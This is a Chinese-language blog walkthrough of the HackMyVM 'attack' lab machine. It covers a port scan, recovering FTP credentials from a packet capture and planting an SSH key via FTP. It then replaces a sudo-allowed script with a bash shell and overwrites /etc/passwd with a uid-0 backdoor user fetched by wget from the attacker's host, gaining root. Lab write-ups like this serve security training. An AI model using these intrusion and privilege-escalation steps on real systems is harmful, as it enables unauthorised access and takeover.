@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="hack-my-vm-attack  端口扫描  12345678910111213kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.134.108                                [17:34:16][sudo] kali 的密码：Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack-my-vm-attack">
+<meta property="og:url" content="http://example.com/2025/04/23/hack-my-vm-attack/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="hack-my-vm-attack  端口扫描  12345678910111213kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.134.108                                [17:34:16][sudo] kali 的密码：Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;n">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/1.png">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/2.png">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/3.png">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/4.png">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/5.png">
+<meta property="og:image" content="http://example.com/2025/04/23/hack-my-vm-attack/6.png">
+<meta property="article:published_time" content="2025-04-23T09:33:05.000Z">
+<meta property="article:modified_time" content="2025-04-23T10:21:32.100Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="HACK-MY-VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/04/23/hack-my-vm-attack/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hack-my-vm-attack</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/04/22/hack-my-vm-easypwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/23/hack-my-vm-attack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/23/hack-my-vm-attack/&text=hack-my-vm-attack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/23/hack-my-vm-attack/&is_video=false&description=hack-my-vm-attack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm-attack&body=Check out this article: http://example.com/2025/04/23/hack-my-vm-attack/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/23/hack-my-vm-attack/&name=hack-my-vm-attack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/23/hack-my-vm-attack/&t=hack-my-vm-attack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hack-my-vm-attack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-23T09:33:05.000Z" itemprop="datePublished">2025-04-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/HACK-MY-VM/" rel="tag">HACK-MY-VM</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center"> hack-my-vm-attack</h1>
+
+<h2>端口扫描</h2>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.134.108                                [17:34:16]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 17:34 CST</span><br><span class="line">Nmap scan report for 192.168.134.108</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:67:07:CF (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 5.14 seconds</span><br></pre></td></tr></table></figure>
+
+<h2>服务渗透</h2>
+
+<p><strong>FTP没上去，是要用户名密码的</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ftp  192.168.134.108                                                             [17:34:28]</span><br><span class="line">Connected to 192.168.134.108.</span><br><span class="line">220 ProFTPD Server (Debian) [::ffff:192.168.134.108]</span><br><span class="line">Name (192.168.134.108:kali): anonymous</span><br><span class="line">331 Password required for anonymous</span><br><span class="line">Password: </span><br><span class="line">530 Login incorrect.</span><br><span class="line">ftp: Login failed</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>80端口看一看</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.134.108                                                      [17:36:06]</span><br><span class="line">I did a capture with wireshark.</span><br><span class="line">The name of the file is &quot;capture&quot; but i dont remember the extension :(</span><br></pre></td></tr></table></figure>
+
+<p><strong>用了wireshark，然后忘记了拓展名，那估计就是wireshark默认的拓展名字：.pcpa，直接访问capture.pcpa下载了下来，打开直接找和FTP有关的，肯定有密码</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/1.png" alt="1"></p>
+<p><strong>拿到账号密码，直接尝试登录，看看有啥东西，在.ssh目录发现了authorized_keys，我直接尝试把我本机的put上去，看看能否成功</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">229 Entering Extended Passive Mode (|||37157|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">-rw-r--r--   1 teste    teste         748 Apr 23 08:37 authorized_keys</span><br><span class="line">-rw-r--r--   1 teste    teste         394 Jan  7  2021 id_rsa.pub</span><br><span class="line">226 Transfer complete</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash">put authorized_keys</span> </span><br><span class="line">local: authorized_keys remote: authorized_keys</span><br><span class="line">229 Entering Extended Passive Mode (|||12042|)</span><br><span class="line">150 Opening BINARY mode data connection for authorized_keys</span><br><span class="line"><span class="meta prompt_">100% </span><span class="language-bash">|****************************************************************|   748        5.36 MiB/s    00:00 ETA</span></span><br><span class="line">226 Transfer complete</span><br><span class="line">748 bytes sent in 00:00 (169.56 KiB/s)</span><br></pre></td></tr></table></figure>
+
+<p><strong>那就直接远程连接就行</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh teste@192.168.134.108                                                        [17:43:32]</span><br><span class="line">Linux attack 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Apr 23 04:46:47 2025 from 192.168.134.141</span><br><span class="line">teste@attack:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>然后我就卡住了，因为底下有个mysecret.png文件，又有一个提示是找到文件，我以为这个图片有隐写，一直没找到，直接看wp，发现还得回wireshark里面去找</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/2.png" alt="2"></p>
+<p><strong>有一个filexxx.zip，我们去请求下载一下，看能否可以下载</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/3.png" alt="3"></p>
+<p><strong>发现可以下载，我们解压之后发现是一个私钥</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh-keygen -y -f id_rsa                                                          [17:54:47]</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC8yQhKHI2Piesf+mSfTJb16ZHtPxGMbw6b2yWwKf/hxYpFDi7FdsbIQKrXL2QClNIhmvsdDKcVrQrnKhfD4YoGV7GRqjKou6Eh8v2kymNvMtBRKfejdEwmy0/S7YvGVWewzoV4N3HhyxGjqyjGiiHF7drQWU2UGixqkijYOF34JJHQdSvVKF3jpox+Y4MAGD4XD3WhvktBLCdqGtWkGaeSae4fOfgCG5huf6SM638ts7Qr3BZt+uBZL2sz7AuKKiW/jzMOIjOB7rcoukoQVGhD/9372dkDmC1+av2ZGyvFW3ot99xgMOOzhP5Q8IHIZl8OnyTgMzs9bi+O0XGyaCB teste@attack</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是这个私钥并不是我们想要的哪个，teste用户我们已经拿下了，我们仔细去看看wireshark里面的这个包</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/4.png" alt="4"></p>
+<p><strong>而且这个数据巨大，不像是我们下载的那个压缩包，我们拿出数据另存为zip文件看看</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/5.png" alt="5"></p>
+<p><strong>解压发现，有一张二维码图片，扫描之后是一个地址，我们访问之后拿到了私钥</strong></p>
+<p><img src="/2025/04/23/hack-my-vm-attack/6.png" alt="6"></p>
+<p><strong>拿到私钥之后登录即可，提示是执行attack.sh文件，sudo -l 也恰好与该文件执行有关，但是attack.sh里面不是我们想执行的命令</strong></p>
+<p><strong>可是这个程序又在jackob的家目录下，我们直接删了重写就行[因为在我们的家目录，我们肯定有xw权限]</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jackob@attack:~$ ls</span><br><span class="line">attack.sh  flag.sh  note.txt  user.txt</span><br><span class="line">jackob@attack:~$ pwd</span><br><span class="line">/home/jackob</span><br><span class="line">jackob@attack:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jackob on attack:</span><br><span class="line">    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jackob may run the following commands on attack:</span><br><span class="line">    (kratos) NOPASSWD: /home/jackob/attack.sh</span><br><span class="line">jackob@attack:~$ rm -rf attack.sh </span><br><span class="line">jackob@attack:~$ echo &quot;bash&quot; &gt; attack.sh &amp;&amp; chmod +x attack.sh </span><br><span class="line">jackob@attack:~$ sudo -u kratos /home/jackob/attack.sh</span><br><span class="line">kratos@attack:~$ id</span><br><span class="line">uid=1002(kratos) gid=1002(kratos) groups=1002(kratos)</span><br><span class="line">kratos@attack:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>拿到kratos权限，再看看有啥东西</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kratos@attack:~$ sudo -l</span><br><span class="line">Matching Defaults entries for kratos on attack:</span><br><span class="line">    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User kratos may run the following commands on attack:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/cppw</span><br></pre></td></tr></table></figure>
+
+<p><strong>cppw应该是自己写的，和网上查到的不太一样</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kratos@attack:~$ sudo /usr/sbin/cppw</span><br><span class="line">cppw: wrong number of arguments, -h for usage</span><br><span class="line">cppw: no changes</span><br><span class="line">kratos@attack:~$ sudo /usr/sbin/cppw -h</span><br><span class="line">Usage:</span><br><span class="line">`cppw &lt;file&gt;&#x27; copys over /etc/passwd   `cppw -s &lt;file&gt;&#x27; copys over /etc/shadow</span><br><span class="line">`cpgr &lt;file&gt;&#x27; copys over /etc/group    `cpgr -s &lt;file&gt;&#x27; copys over /etc/gshadow</span><br></pre></td></tr></table></figure>
+
+<p><strong>给了用法示例，第一个命令直接覆盖&#x2F;etc&#x2F;passwd，那就简单了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  openssl passwd 123                                                                                                              [18:17:30]</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$RGaY3Vjt<span class="variable">$z1NRZgq0nt5bQ</span>.T5AOPge.</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>然后写一个用户就行了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  cat a                                                                                                                           [18:18:41]</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">teste:x:1000:1000:teste,,,:/home/teste:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin</span><br><span class="line">ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin</span><br><span class="line">jackob:x:1001:1001:,,,:/home/jackob:/bin/bash</span><br><span class="line">kratos:x:1002:1002:,,,:/home/kratos:/bin/bash</span><br><span class="line">sunrt:$1$RGaY3Vjt$z1NRZgq0nt5bQ.T5AOPge.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>传过去执行就行了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">kratos@attack:/home/kratos$ wget http://192.168.134.141:8000/a</span><br><span class="line">--2025-04-23 06:20:15--  http://192.168.134.141:8000/a</span><br><span class="line">Connecting to 192.168.134.141:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1649 (1.6K) [application/octet-stream]</span><br><span class="line">Saving to: ‘a’</span><br><span class="line"></span><br><span class="line">a                                      100%[============================================================================&gt;]   1.61K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2025-04-23 06:20:15 (219 MB/s) - ‘a’ saved [1649/1649]</span><br><span class="line"></span><br><span class="line">kratos@attack:/home/kratos$ ls</span><br><span class="line">a</span><br><span class="line">kratos@attack:/home/kratos$ sudo -l</span><br><span class="line">Matching Defaults entries for kratos on attack:</span><br><span class="line">    !env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User kratos may run the following commands on attack:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/cppw</span><br><span class="line">kratos@attack:/home/kratos$ sudo /usr/sbin/cppw a</span><br><span class="line">kratos@attack:/home/kratos$ su - sunrt</span><br><span class="line">Password: </span><br><span class="line">root@attack:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@attack:~# </span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"> hack-my-vm-attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">服务渗透</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/23/hack-my-vm-attack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/23/hack-my-vm-attack/&text=hack-my-vm-attack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/23/hack-my-vm-attack/&is_video=false&description=hack-my-vm-attack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm-attack&body=Check out this article: http://example.com/2025/04/23/hack-my-vm-attack/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/23/hack-my-vm-attack/&title=hack-my-vm-attack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/23/hack-my-vm-attack/&name=hack-my-vm-attack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/23/hack-my-vm-attack/&t=hack-my-vm-attack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
